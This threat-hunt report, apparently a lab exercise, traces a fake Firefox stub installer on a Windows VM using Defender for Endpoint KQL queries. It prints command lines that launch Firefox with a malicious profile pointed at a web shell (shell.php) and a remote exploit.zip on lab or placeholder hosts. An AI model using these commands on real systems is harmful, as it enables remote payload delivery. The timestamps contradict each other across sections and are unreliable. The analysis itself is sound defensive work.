<img width="400" src="https://github.com/user-attachments/assets/06701f92-d410-4a48-b8b5-eba364812972" />

# Threat Hunt Report – Firefox Used as a Web Shell Relay
- [Scenario Creation](https://github.com/antoniofranc/Threat-Hunt-Scenario-Firefox-as-a-Web-Shell-Relay-/blob/main/threat-hunting-scenario-firefox-as-a-web-shell-relay.md)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Mozilla Firefox (installed via malicious stub)

##  Scenario

Security monitoring flagged suspicious behavior on workstation `snet` associated with user `employee0`.
At first glance, the endpoint showed a deleted Firefox executable, but further telemetry revealed a malicious installation and usage of Firefox as a `web shell relay`.

The installation was initiated through a malicious stub file that attempted to launch Firefox with a temporary malicious profile and connect to an external command-and-control (C2) URL hosted on `172.203.80.23`/admin/shell.php.

This behavior strongly indicates unauthorized browser installation and potential remote access activity through web shell relay techniques.


### High-Level Firefox-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for creation or deletion of `firefox.exe` or related stub installers.
- **Check `DeviceProcessEvents`** for suspicious Firefox process launches with command-line flags.
- **Check `DeviceNetworkEvents`** for outbound HTTP requests to unauthorized IPs or domains.

---

## Steps Taken

### 1. Searched the `DeviceFileEvents` Table

Initial query revealed that employee0 executed a Firefox installer from their Downloads directory, which created temporary folders named Temp and MalProfile, later deleted.
Evidence revealed a deleted executable:
`C:\Program Files\Mozilla Firefox\firefox.exe`
The deletion occurred at `2025-10-12 01:55:24 AM`, immediately after execution by user employee0.

The initiating process was a suspicious stub: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "snet"
| where InitiatingProcessAccountName == "employee0"
| where FileName contains "firefox.exe"
| where FolderPath contains "Mozilla Firefox"
| where Timestamp >=  datetime(2025-10-12T04:29:57.4331627Z)
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName, InitiatingProcessCommandLine


```
<img src="https://github.com/user-attachments/assets/0994355f-14ed-43a7-8f58-72f54ac9c8d2" />



---

### 2. Searched the `DeviceProcessEvents` Table Firefox Launch Parameters

I searched the DeviceProcessEvents table for any ProcessCommandLine containing the string `setup-stub.exe`. Based on the returned logs, The stub executed Firefox in non-interactive (no-remote) mode with a temporary malicious profile named `MalProfile`.
The command also contained a direct HTTP reference to `/admin/shell.php`, indicating a potential reverse shell or web shell callback. 
Further investigation revealed setup-stub.exe launching Firefox with malicious arguments, linking directly to remote payloads.

**Query used to locate event:**

```kql
DeviceProcessEvents
| where DeviceName == "snet"
| where ProcessCommandLine contains "setup-stub.exe" 
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
```
<img width="1680" height="293" alt="image" src="https://github.com/user-attachments/assets/a9cb616c-62e2-41d8-ab77-9ed6de0da1af" />


---

### 3. Searched the `DeviceProcessEvents` Table for Setup and Command Execution

I searched the DeviceProcessEvents table for any malicious command-line activity by user "employee0" and identified three separate executions of `download.exe` from randomized temporary directories. Each instance used the `/LaunchedFromStub` parameter and executed within rapid succession.

The pattern of random temporary folder names combined with quick sequential execution provides strong indicators of automated malware dropper activity, designed specifically to evade detection while establishing persistence on the compromised system.
**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "snet"
| where ProcessCommandLine contains "download.exe"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
```
<img width="1883" height="224" alt="image" src="https://github.com/user-attachments/assets/10195357-95fe-4df4-8a1d-23714e7db048" />


---


## Chronological Event Timeline 

### 1. Initial Legitimate Firefox Download

- **Timestamp:** `2025-10-12T04:29:57Z`
- **Event:** Firefox installer file created in Downloads.
- **Source:** `https://download-installer.cdn.mozilla.net/pub/firefox/releases/143.0.4/win32/en-US/Firefox%20Installer.exe`
- **Location:** `C:\Users\employee0\Downloads\Firefox Installer.exe`
- **Note:** This appears to be the initial legitimate Firefox installer download

### 2. First Malicious Execution Chain

- **Timestamp:** `2025-10-12T04:53:13.2308235Z`
- **Event:** `ProcessCreated - setup-stub.exe`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zSC13643DD\setup-stub.exe.`
- **SHA256:** `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac`
- **Command:** `setup-stub.exe /S`
- Initial execution of the malicious stub

- **Timestamp:** `2025-10-12T05:11:57.3966573Z`
- **Event:**  `ProcessCreated - setup-stub.ex`
- **SHA256::** `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS065AF25E\setup-stub.exe`
- **Command:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile"`
- First instance with malicious profile parameter

- **Timestamp:** `2025-10-12T05:11:57.3966573Z`
- **Event:** `ProcessCreated - download.exe`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\nskC4FD.tmp\download.exe`
- **Command:** `"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\config.ini`
- First download.exe execution (malware dropper)

- **Timestamp:** `**2025-10-12T05:11:59.9392824Z`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS0A601D8E\core\`
- Initiating Process: `download.exe` from previous step
- Temporary Firefox files created

- **Timestamp:**  `2025-10-12T05:12:27.0038042Z`
- **Event:** `FileDeleted - Temporary firefox.exe files`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS0A601D8E\core\firefox.exe`
- Cleanup of temporary files
  

### 3. Second Malicious Execution Chain

- **Timestamp:**  `2025-10-12T05:54:42.4659997Z `
- **Event:** `ProcessCreated - setup-stub.exe`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zSC0188666\setup-stub.exe`
- **SHA256:**: `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac`
- **Command:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://192.168.1.100/exploit.zip`
- First instance with remote payload URL

- **Timestamp:** `2025-10-12T05:54:48.7170084Z `
- **Event:**: `ProcessCreated - download.exe `
- **Location:** `C:\Users\employee0\AppData\Local\Temp\nso90D.tmp\download.exe`
- **SHA256:**: `b5284b0e4a5f867a1342a4bc5a7ca21b9c13c49bea1b48624b691473d14dec78`
- **Command:**`"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nso90D.tmp\config.ini`
- Second `download.exe` execution

- **Timestamp:** 2025-10-12T05:55:14.8912748Z
- **Event:** `FileDeleted - Temporary firefox.exe files`
- Cleanup phase


### 4. Third and Most Malicious Execution Chain

- **Timestamp:** `2025-10-12T05:55:21.0304675Z`
- **Event:**: `ProcessCreated - setup-stub.exe`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS847CA906\setup-stub.exe`
- **Command:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://[YOUR-LAB-IP]/admin/shell.php`
- Critical: Direct reference to web shell (shell.php)

- **Timestamp:** `2025-10-12T05:55:21.0304675Z`
- **Event:**: `ProcessCreated - setup-stub.exe`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS8F22E6D6\setup-stub.exe`
- **SHA256:**: `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac`
- Command: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://[YOUR-LAB-IP]/exploit.zip`

- **Timestamp:** `2025-10-12T05:55:24.8206767Z`
- **Event:**: `FileDeleted - firefox.exe`
- **Location:**  `C:\Program Files\Mozilla Firefox\firefox.exe`
**Critical:** Legitimate Firefox executable deleted
**Initiating Process:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://[YOUR-LAB-IP]/admin/shell.php`
- Direct evidence of malicious activity

- **Timestamp:** `2025-10-12T05:55:31.4027468Z`
- **Event:**: `ProcessCreated - download.exe`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\nss9E77.tmp\download.exe`
- Command: `"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nss9E77.tmp\config.ini`
- `Third download.exe execution`

- **Timestamp:** `2025-10-12T05:55:34.7619558Z`
- **Event:**: `FileCreated - Temporary firefox files`
- **Location:** C:\Users\employee0\AppData\Local\Temp\7zS42D037B6\core\

- **Timestamp:** 2025-10-12T05:55:48.2234446Z
- **Event:**: FileCreated - Firefox shortcuts and program files
- Final installation phase

- **Timestamp:** `2025-10-12T05:55:59.6025505Z`
- **Location:** `C:\Users\employee0\AppData\Local\Temp\nss9E77.tmp\download.exe`
- **Event:**: `Temporary firefox.exe files`
Final cleanup

---

## Summary

On October 12, 2025, user employee0 on endpoint snet executed a multi-stage attack that weaponized the Firefox browser. The attack began at 01:11:56 AM with a silent installer and proceeded through a series of dropper executions `(download.exe)`. The primary tactic, observed at 01:55:20 AM, involved using `setup-stub.exe` to launch Firefox with command-line arguments designed to connect to a web shell `(/admin/shell.php)` and download a malicious payload `(exploit.zip)`. The attacker then attempted to cover their tracks at 01:55:24 AM by deleting the main Firefox executable. The hunt successfully confirmed the initial hypothesis that Firefox was being abused as a covert relay for malicious web communication.




---

## Response Taken

- The endpoint snet was immediately isolated from the network.
- User “employee0” account access was suspended pending further investigation.
- All SHA256 and file paths were submitted for Threat Intelligence correlation.
- A full forensic image of the system was requested for deep analysis.
- Management and the SOC team were notified.


---
